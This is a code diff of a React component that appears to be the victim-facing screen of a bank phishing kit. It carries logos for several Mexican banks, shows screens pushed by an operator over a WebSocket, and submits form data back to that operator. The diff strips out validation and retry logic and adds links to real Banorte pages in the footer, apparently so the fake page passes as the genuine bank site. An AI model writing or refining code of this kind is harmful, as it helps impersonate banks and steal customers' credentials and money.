@@ -28,39 +28,14 @@ import banregioLogoWhite from '../assets/banregio_logo_white.png';
 import platacardLogo from '../assets/platacard_logo.png';
 
 export default function ClientScreen() {
-  // Check both possible routes for the session ID
-  const [matchClient, paramsClient] = useRoute<{ sessionId: string }>('/client/:sessionId');
-  const [matchDirect, paramsDirect] = useRoute<{ sessionId: string }>('/:sessionId(\\d{8})');
-  
-  // Use whichever route matched
-  const sessionId = matchClient 
-    ? paramsClient?.sessionId 
-    : matchDirect 
-      ? paramsDirect?.sessionId 
-      : '';
-      
-  // Log route matching for debugging
-  useEffect(() => {
-    console.log('ClientScreen - Route status:', { 
-      matchClient, 
-      matchDirect, 
-      paramsClient,
-      paramsDirect,
-      sessionId 
-    });
-  }, [matchClient, matchDirect, paramsClient, paramsDirect, sessionId]);
-  
-  // Validar el sessionId (debe ser un número de 8 dígitos)
-  const isValidSessionId = /^\d{8}$/.test(sessionId);
+  // Get session ID from URL
+  const [, params] = useRoute('/client/:sessionId');
+  const sessionId = params?.sessionId || '';
   
   // State for the current screen
   const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.VALIDANDO);
   const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({});
   const [bankLoaded, setBankLoaded] = useState<boolean>(false);
-  
-  // Estado para errores
-  const [error, setError] = useState<string | null>(null);
-  const [loadingState, setLoadingState] = useState<'loading' | 'error' | 'success'>('loading');
   
   // Additional screen-specific state
   const [screenData, setScreenData] = useState<{
@@ -105,36 +80,13 @@ export default function ClientScreen() {
   // Register with the server when connection is established
   useEffect(() => {
     if (connected && sessionId) {
-      console.log(`Registrando cliente con sessionId: ${sessionId}`);
-      
-      // Intentar registrarse múltiples veces para garantizar éxito
-      const registerMessage = {
+      sendMessage({
         type: 'REGISTER',
         role: 'CLIENT',
         sessionId
-      };
-      
-      // Enviar mensaje de registro inicial
-      sendMessage(registerMessage);
-      
-      // Configurar reintentos para asegurar el registro
-      const retryRegistration = setInterval(() => {
-        if (socket?.readyState === WebSocket.OPEN) {
-          console.log(`Reintentando registro de cliente: ${sessionId}`);
-          sendMessage(registerMessage);
-        }
-      }, 2000);
-      
-      // Limpiar el intervalo después de algunos intentos
-      setTimeout(() => {
-        clearInterval(retryRegistration);
-      }, 10000);
-      
-      return () => {
-        clearInterval(retryRegistration);
-      };
+      });
     }
-  }, [connected, sessionId, sendMessage, socket]);
+  }, [connected, sessionId, sendMessage]);
 
   // Handle WebSocket messages
   useEffect(() => {
@@ -142,48 +94,16 @@ export default function ClientScreen() {
 
     const handleMessage = (event: MessageEvent) => {
       try {
-        console.log("WebSocket mensaje recibido (raw):", event.data);
         const message = JSON.parse(event.data);
-        console.log("WebSocket mensaje procesado:", message);
         
-        // Handle PONG from server (response to our PING)
-        if (message.type === 'PONG') {
-          console.log("PONG recibido del servidor:", message);
-          return;
-        }
-        
-        // Handle session init from server
+        // Handle different message types
         if (message.type === 'INIT_SESSION') {
-          console.log("INIT_SESSION recibido, datos:", message.data);
-          
-          if (!message.data) {
-            console.error("INIT_SESSION sin datos, solicitando nuevamente...");
-            // Intentar registrarse de nuevo si no hay datos
-            if (sessionId) {
-              sendMessage({
-                type: 'REGISTER',
-                role: 'CLIENT',
-                sessionId
-              });
-            }
-            return;
-          }
-          
-          // Guardar datos de sesión
           setSessionData(message.data);
           setBankLoaded(true);
-          
           // Set initial screen based on session data
           if (message.data.pasoActual) {
-            console.log(`Estableciendo pantalla inicial a: ${message.data.pasoActual}`);
             setCurrentScreen(message.data.pasoActual as ScreenType);
-          } else {
-            console.log("No hay pasoActual en datos de sesión, usando FOLIO por defecto");
-            setCurrentScreen(ScreenType.FOLIO);
           }
-          
-          // Detener la animación de carga después de recibir datos
-          setShowInitialMessage(false);
         }
         else if (message.type === 'SCREEN_CHANGE') {
           const { tipo, ...data } = message.data;
@@ -223,11 +143,6 @@ export default function ClientScreen() {
           
           // Update screen-specific data
           setScreenData(data);
-          
-          // Asegurarse de que no estemos en modo de mensaje inicial
-          setShowInitialMessage(false);
-        } else {
-          console.log(`Mensaje tipo desconocido: ${message.type}`, message);
         }
       } catch (error) {
         console.error("Error processing WebSocket message:", error);
@@ -235,19 +150,8 @@ export default function ClientScreen() {
     };
 
     socket.addEventListener('message', handleMessage);
-    
-    // Solicitar datos de sesión inmediatamente si tenemos sessionId
-    if (socket.readyState === WebSocket.OPEN && sessionId) {
-      console.log("Solicitando datos de sesión al conectar WebSocket");
-      sendMessage({
-        type: 'REGISTER',
-        role: 'CLIENT',
-        sessionId
-      });
-    }
-    
     return () => socket.removeEventListener('message', handleMessage);
-  }, [socket, sessionId, sendMessage]);
+  }, [socket]);
 
   // Handle form submissions
   const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
@@ -833,63 +737,6 @@ export default function ClientScreen() {
       </>
     );
     
-    // Verificar si el sessionId es válido
-    if (!sessionId || !isValidSessionId) {
-      return (
-        <div className="min-h-screen flex flex-col bg-white">
-          <header className="bg-[#EC1C24] text-white p-4 text-center">
-            <h1 className="text-xl font-bold">Sistema Bancario</h1>
-            <div className="text-sm">{formatDate(new Date())}</div>
-          </header>
-          
-          <div className="flex-grow flex items-center justify-center flex-col p-6 text-center">
-            <div className="p-4 bg-red-100 text-red-700 rounded-md mb-4">
-              <h2 className="text-xl font-bold mb-2">Código de sesión no válido</h2>
-              <p>El código debe ser un número de 8 dígitos.</p>
-              <p className="mt-4">Código actual: {sessionId || 'No especificado'}</p>
-            </div>
-            
-            <div className="mt-4">
-              <a 
-                href="/" 
-                className="bg-[#EC1C24] text-white px-4 py-2 rounded-md hover:bg-red-700"
-              >
-                Regresar a la página principal
-              </a>
-            </div>
-          </div>
-        </div>
-      );
-    }
-    
-    // Si no tenemos conexión WebSocket
-    if (!connected && showInitialMessage) {
-      return (
-        <div className="min-h-screen flex flex-col bg-white">
-          <header className="bg-[#EC1C24] text-white p-4 text-center">
-            <h1 className="text-xl font-bold">Sistema Bancario</h1>
-            <div className="text-sm">{formatDate(new Date())}</div>
-          </header>
-          
-          <div className="flex-grow flex items-center justify-center flex-col p-6 text-center">
-            <div className="mb-4">
-              <div className="animate-spin w-8 h-8 border-4 border-[#EC1C24] border-t-transparent rounded-full mx-auto"></div>
-            </div>
-            <h2 className="text-xl font-bold mb-2">Conectando con el servidor...</h2>
-            <p className="text-gray-600">Sesión: {sessionId}</p>
-            <p className="text-gray-600 mt-2">Por favor espere un momento...</p>
-            
-            <button 
-              onClick={() => window.location.reload()}
-              className="mt-8 bg-[#EC1C24] text-white px-4 py-2 rounded-md hover:bg-red-700"
-            >
-              Recargar página
-            </button>
-          </div>
-        </div>
-      );
-    }
-    
     // Si no se ha cargado el banco aún, mostramos una pantalla genérica de carga
     if (!bankLoaded) {
       return (
@@ -903,16 +750,18 @@ export default function ClientScreen() {
           
           <footer className="mt-auto">
             <div className="bg-gray-100 p-4 text-center text-sm">
-              <span className="text-gray-600 mx-2">Aprende más</span>
-              <span className="text-gray-600 mx-2">Ayuda</span>
-              <span className="text-gray-600 mx-2">Términos y condiciones</span>
-              <span className="text-gray-600 mx-2">Seguridad en línea</span>
+              <a href="https://www.banorte.com/" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Aprende más</a>
+              <a href="https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Ayuda</a>
+              <a href="https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Términos y condiciones</a>
+              <a href="https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Seguridad en línea</a>
             </div>
             <div className="bg-gray-800 text-white p-4 text-center text-sm">
-              <div className="mb-2">
-                <span className="text-white mx-2">Contáctanos</span> |
-                <span className="text-white mx-2">Aclaraciones</span> |
-                <span className="text-white mx-2">Promociones</span>
+              <div className="mb-3">
+                <a href="https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Contáctanos</a> |
+                <a href="https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Aclaraciones</a> |
+                <a href="https://www.banorte.com/wps/portal/banorte/Home/promociones/todas" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a> |
+                <a href="https://www.facebook.com/BanorteOficial" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
+                <a href="https://www.youtube.com/user/GFBanorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">YouTube</a>
               </div>
               <div>© Banca Digital 2024. Todos los Derechos Reservados</div>
             </div>
